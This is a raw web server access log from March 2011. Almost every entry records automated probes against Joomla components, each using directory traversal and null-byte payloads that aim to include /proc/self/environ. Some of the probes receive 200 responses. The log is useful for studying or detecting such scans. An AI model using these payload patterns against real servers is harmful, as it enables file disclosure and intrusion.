91.121.88.56 - - [22/Mar/2011:02:57:28 +0900] "GET ///index.php?option=com_google&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
76.97.16.122 - - [22/Mar/2011:02:58:30 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
27.131.1.56 - - [22/Mar/2011:02:58:51 +0900] "GET //?option=com_rwcards&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
76.97.16.122 - - [22/Mar/2011:03:00:30 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:03:00:46 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.191.171.38 - - [22/Mar/2011:03:00:47 +0900] "GET //index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:03:01:27 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:03:03:08 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:03:03:15 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:03:04:46 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:03:06:02 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.191.171.38 - - [22/Mar/2011:03:07:36 +0900] "GET /access_log.last//index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
91.191.171.38 - - [22/Mar/2011:03:07:36 +0900] "GET //index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:03:11:02 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:03:14:21 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.191.171.38 - - [22/Mar/2011:03:16:33 +0900] "GET /access_log.last//index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
91.191.171.38 - - [22/Mar/2011:03:16:34 +0900] "GET //index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
70.38.38.106 - - [22/Mar/2011:03:17:31 +0900] "GET /?option=com_sectionex&controller=..//..//..//..//..//..//..//..///proc/self/environ%00 HTTP/1.1" 200 954
178.131.1.247 - - [22/Mar/2011:03:18:52 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:03:19:43 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.191.171.38 - - [22/Mar/2011:03:23:20 +0900] "GET //index.php?option=com_market&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
216.119.140.66 - - [22/Mar/2011:03:24:39 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
67.228.238.207 - - [22/Mar/2011:03:26:05 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
67.228.238.207 - - [22/Mar/2011:03:26:34 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
196.40.97.161 - - [22/Mar/2011:03:27:58 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
196.40.97.161 - - [22/Mar/2011:03:30:13 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:03:31:48 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
198.106.5.87 - - [22/Mar/2011:03:33:21 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:33:58 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:33:59 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:33:59 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:00 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
198.106.5.87 - - [22/Mar/2011:03:34:13 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
198.106.5.87 - - [22/Mar/2011:03:34:14 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:16 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:16 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:34:17 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:34:17 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:17 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:17 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
198.106.5.87 - - [22/Mar/2011:03:34:20 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:34:20 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
198.106.5.87 - - [22/Mar/2011:03:34:20 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:21 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
198.106.5.87 - - [22/Mar/2011:03:34:29 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
198.106.5.87 - - [22/Mar/2011:03:34:29 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:30 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:34:30 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
198.106.5.87 - - [22/Mar/2011:03:34:33 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
198.106.5.87 - - [22/Mar/2011:03:34:34 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:38 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:34:39 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:34:47 +0900] "GET /access_log//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 227
62.142.11.3 - - [22/Mar/2011:03:34:48 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:03:35:31 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:36:01 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:36:01 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:36:05 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:36:06 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:36:07 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:36:07 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:36:07 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:36:08 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:36:21 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
70.38.38.106 - - [22/Mar/2011:03:36:51 +0900] "GET /?option=com_sectionex&controller=..//..//..//..//..//..//..//..///proc/self/environ%00 HTTP/1.1" 200 954
62.142.11.3 - - [22/Mar/2011:03:37:02 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:37:09 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:37:09 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:37:20 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:37:20 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.142.11.3 - - [22/Mar/2011:03:37:50 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:37:51 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
213.248.45.30 - - [22/Mar/2011:03:37:55 +0900] "GET /index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.142.11.3 - - [22/Mar/2011:03:37:56 +0900] "GET /access_log.last//index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.142.11.3 - - [22/Mar/2011:03:37:56 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
213.248.45.30 - - [22/Mar/2011:03:39:13 +0900] "GET /access_log.last/index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.248.45.30 - - [22/Mar/2011:03:39:14 +0900] "GET /index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
178.131.1.247 - - [22/Mar/2011:03:40:11 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
198.106.5.87 - - [22/Mar/2011:03:41:43 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
217.133.235.156 - - [22/Mar/2011:03:44:08 +0900] "GET /index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
198.106.5.87 - - [22/Mar/2011:03:48:53 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
98.100.212.162 - - [22/Mar/2011:03:49:54 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
198.106.5.87 - - [22/Mar/2011:03:50:06 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
207.150.191.28 - - [22/Mar/2011:04:01:36 +0900] "GET ///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
207.150.191.28 - - [22/Mar/2011:04:01:52 +0900] "GET /access_log.last///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
207.150.191.28 - - [22/Mar/2011:04:01:53 +0900] "GET ///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
207.150.191.28 - - [22/Mar/2011:04:02:15 +0900] "GET /access_log.last///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
207.150.191.28 - - [22/Mar/2011:04:02:16 +0900] "GET ///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
207.150.191.28 - - [22/Mar/2011:04:02:30 +0900] "GET /access_log.last///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
207.150.191.28 - - [22/Mar/2011:04:02:31 +0900] "GET ///index.php?option=com_joomlaupdater&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
98.100.212.162 - - [22/Mar/2011:04:06:58 +0900] "GET /access_log.last/?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
98.100.212.162 - - [22/Mar/2011:04:06:58 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
65.40.6.6 - - [22/Mar/2011:04:09:04 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
70.32.104.240 - - [22/Mar/2011:04:09:12 +0900] "GET /?option=com_jvehicles&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
98.100.212.162 - - [22/Mar/2011:04:09:29 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
91.191.171.38 - - [22/Mar/2011:04:11:14 +0900] "GET //index.php?option=com_market&controller==../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
217.133.235.156 - - [22/Mar/2011:04:16:28 +0900] "GET /access_log.last/index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
217.133.235.156 - - [22/Mar/2011:04:16:31 +0900] "GET /index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
76.97.16.122 - - [22/Mar/2011:04:16:43 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.191.171.38 - - [22/Mar/2011:04:21:10 +0900] "GET //index.php?option=com_market&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
207.150.191.28 - - [22/Mar/2011:04:21:19 +0900] "GET ////index.php?option=com_g2bridge&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 218
76.97.16.122 - - [22/Mar/2011:04:22:37 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:04:25:14 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
66.249.68.98 - - [22/Mar/2011:04:26:52 +0900] "GET /robots.txt HTTP/1.1" 404 216
66.249.69.237 - - [22/Mar/2011:04:26:55 +0900] "GET /error_log.last HTTP/1.1" 200 2542115
178.131.1.247 - - [22/Mar/2011:04:30:15 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:04:30:35 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:04:30:35 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:04:30:36 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:04:30:37 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:04:30:44 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:04:30:46 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:04:31:49 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:04:32:23 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
213.248.45.30 - - [22/Mar/2011:04:40:27 +0900] "GET //index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
87.106.182.143 - - [22/Mar/2011:04:41:13 +0900] "GET /access_log.last/?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
87.106.182.143 - - [22/Mar/2011:04:41:14 +0900] "GET /?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
76.97.16.122 - - [22/Mar/2011:04:42:09 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.35.111 - - [22/Mar/2011:04:42:43 +0900] "GET ///index2.php?option=com_myblog&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 218
178.131.1.247 - - [22/Mar/2011:04:46:02 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
213.248.45.30 - - [22/Mar/2011:04:46:31 +0900] "GET /access_log.last//index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
213.248.45.30 - - [22/Mar/2011:04:46:32 +0900] "GET //index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
217.133.235.156 - - [22/Mar/2011:04:48:31 +0900] "GET //index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.74.239.206 - - [22/Mar/2011:04:48:56 +0900] "GET //index.php?option=com_preventive&controller=..//..//..//..//..//..//..//..///proc/self/environ%0000 HTTP/1.1" 404 216
98.100.212.162 - - [22/Mar/2011:04:49:27 +0900] "GET /access_log.last/?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
98.100.212.162 - - [22/Mar/2011:04:49:27 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
178.131.1.247 - - [22/Mar/2011:04:50:12 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:04:52:12 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:04:55:20 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:04:55:26 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:04:57:13 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:04:57:17 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
202.229.134.2 - - [22/Mar/2011:04:57:17 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:04:59:01 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
202.229.134.2 - - [22/Mar/2011:04:59:01 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:04:59:02 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:04:59:02 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
202.229.134.2 - - [22/Mar/2011:04:59:02 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
207.150.191.28 - - [22/Mar/2011:04:59:06 +0900] "GET ///index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
202.229.134.2 - - [22/Mar/2011:05:00:07 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
202.229.134.2 - - [22/Mar/2011:05:00:07 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
217.133.235.156 - - [22/Mar/2011:05:01:07 +0900] "GET /access_log.last//index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
217.133.235.156 - - [22/Mar/2011:05:01:09 +0900] "GET //index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
217.133.235.156 - - [22/Mar/2011:05:01:43 +0900] "GET /access_log.last//index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
217.133.235.156 - - [22/Mar/2011:05:01:47 +0900] "GET //index.php?option=com_jeajaxeventcalendar&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:05:01:51 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:05:03:05 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
202.229.134.2 - - [22/Mar/2011:05:03:05 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:05:03:41 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
202.229.134.2 - - [22/Mar/2011:05:03:41 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:05:04:31 +0900] "GET /access_log.last//index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
